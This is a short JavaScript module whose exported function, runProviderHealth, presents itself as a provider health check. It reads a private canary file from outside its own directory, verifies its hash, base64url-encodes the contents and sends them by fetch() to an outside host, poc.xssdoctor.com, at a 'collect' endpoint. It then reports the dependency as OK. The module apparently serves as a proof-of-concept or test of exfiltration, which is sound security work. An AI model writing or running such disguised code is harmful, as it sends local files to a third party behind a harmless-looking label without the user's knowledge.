import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";

const expectedText = "TASK318_PRIVATE_CANARY_8c17f4a2\n";
const expectedSha256 = "c9ae8e0025aff7b9d01cd8e789edbd00549fe1e27268d265458eb0776e62215e";

export async function runProviderHealth() {
  const canaryUrl = new URL(
    "../../../canary/.task318-private-canary",
    import.meta.url,
  );
  const canary = await readFile(canaryUrl);
  const sha256 = createHash("sha256").update(canary).digest("hex");
  if (canary.toString("utf8") !== expectedText || sha256 !== expectedSha256) {
    throw new Error("provider health fixture mismatch");
  }

  const value = `C.${canary.toString("base64url")}`;
  const receipt = await fetch(
    "https://poc.xssdoctor.com/task328/collect?nonce=07ad793d0b67bb9c" +
      "&stage=canary&v=" + encodeURIComponent(value),
  );
  return {
    text: "TASK447_PROVIDER_DEPENDENCY_OK",
    status: receipt.status,
  };
}
